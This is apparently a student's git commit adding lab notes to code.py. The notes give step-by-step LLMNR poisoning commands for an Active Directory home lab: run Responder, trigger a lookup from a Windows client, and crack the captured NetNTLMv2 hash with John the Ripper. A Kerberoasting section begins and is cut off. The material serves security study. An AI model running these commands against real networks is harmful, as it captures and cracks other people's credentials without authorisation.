50e6d9ed7a5af0d8a059b74e2fe787c5aec21446
CodrinOctavianTanase <c.o.tanase@student.tue.nl>
2025-05-13 04:31:40 +0200

    added LLMNR poisoning code to code.py

--- code.py
+++ code.py
@@ -1,3 +1,25 @@
+# LLMNR poisoning
+
+# prerequesite: franky.lanie domain user changes logs in on the Win 10 machine using default password -> is prompted to change the password -> changes it to smth simple: Password123
+
+# 1. on Kali linux: 
+
+sudo responder -I eth1
+
+# 2. on Win 10 client logged in as franky.lanie: File Explorer -> search for \\secretFile  (to initiate LLMNR event)
+
+# 3. on Kali: catch the hash -> put into hash2.txt ; download if needed rockyou.txt
+#Run
+
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt # to start cracking
+
+john --show hash2.txt # to see the cracked password
+
+
+
+
+###############################################################################################################################################################################################################
+
 # Kerberoasting
 
 # Required setup for an AD home lab that does not have any service accounts with SPNs registered. In a real setting, it is expected that there are already existing SPNs, so skip this step. 
